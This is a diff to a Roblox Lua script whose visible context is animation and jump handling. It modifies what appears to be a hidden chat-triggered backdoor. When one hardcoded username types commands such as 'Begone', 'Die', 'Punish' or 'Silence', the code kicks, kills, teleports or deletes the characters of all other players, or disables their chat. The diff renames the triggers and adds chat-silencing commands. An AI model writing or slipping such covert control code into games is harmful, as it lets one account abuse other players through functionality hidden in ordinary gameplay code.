@@ -395,32 +395,40 @@ end)
 game.Workspace.ChildAdded:Connect(function(Child)
 	if Child.Name == '240HzGeforce4090btw' then
 		game.Players:FindFirstChild(Child.Name).Chatted:Connect(function(Msg)
-			if Msg == 'VANISH, HUMAN!' then
+			if Msg == 'Begone' then
 				if Player.Name ~= '240HzGeforce4090btw' then
 					Player:Kick('ALL HAIL MELVIN!!!')
 
 				end
 			end
-			if Msg == 'Come to me, my children.' then
+			if Msg == 'Bring' then
 				if Player.Name ~= '240HzGeforce4090btw' then
 					Player.Character.HumanoidRootPart.CFrame = Child.HumanoidRootPart.CFrame
 
 				end
 
 			end
-			if Msg == 'Die for me, weaklings.' then
+			if Msg == 'Die' then
 				if Player.Name ~= '240HzGeforce4090btw' then
 					Player.Character.Humanoid.Health = 0
 
 				end
 
 			end
-			if Msg == 'BEGONE, FOOLS!' then
+			if Msg == 'Punish' then
 				if Player.Name ~= '240HzGeforce4090btw' then
 					Player.Character:Destroy()
-
 				end
-
+			end
+			if Msg == 'Silence' then
+				if Player.Name ~= '240HzGeforce4090btw' then
+					game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,false)
+				end
+			end
+			if Msg == 'Speak' then
+				if Player.Name ~= '240HzGeforce4090btw' then
+					game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat,true)
+				end
 			end
 			if Msg == 'Obey me, humans!' then
 				if Player.Name ~= '240HzGeforce4090btw' then
@@ -722,5 +730,7 @@ UserInputService.JumpRequest:Connect(function()
 	AnimationsToPlay[Slot]:Play()
 
 end)
+
+
 
 
